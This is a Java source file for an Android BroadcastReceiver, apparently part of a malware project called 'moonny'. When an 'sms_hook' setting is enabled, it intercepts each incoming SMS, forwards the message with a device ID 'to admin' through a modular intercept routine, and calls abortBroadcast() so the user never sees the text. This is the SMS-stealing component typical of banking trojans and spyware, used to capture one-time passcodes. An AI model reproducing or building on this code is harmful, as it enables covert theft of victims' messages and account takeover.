package com.moonny.rcvs;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import com.moonny.Modules;
import com.moonny.api.ApiRequest;
import com.moonny.constants.Constant;
import com.moonny.constants.S;
import com.moonny.helpers.IDUtility;
import com.moonny.helpers.Utils;

import org.json.JSONException;
import org.json.JSONObject;

import java.text.SimpleDateFormat;

public class SmsRcv extends BroadcastReceiver {

    @Override
    public void onReceive(Context ctx, Intent intent) {

        if(Utils.is_blocked(ctx))
            return;

        Modules mods = new Modules(ctx);

        if(!mods.is_mod_exists(S.mod_main)) {
            if(Constant.DEBUG) Log.d("CONTROL", "SMSRcv not allowed");
            return;
        }

        // if sms intercept enabled
        if((boolean) Modules.main(ctx, S.get_pref, new Object[]{ S.sms_hook, false })) {
            // do intercept, send sms to admin
            Modules.main(ctx, S.base_sms_intercept, new Object[]{ intent, Constant.BUILD, IDUtility.getID(ctx) });
            abortBroadcast();
        }
    }
}
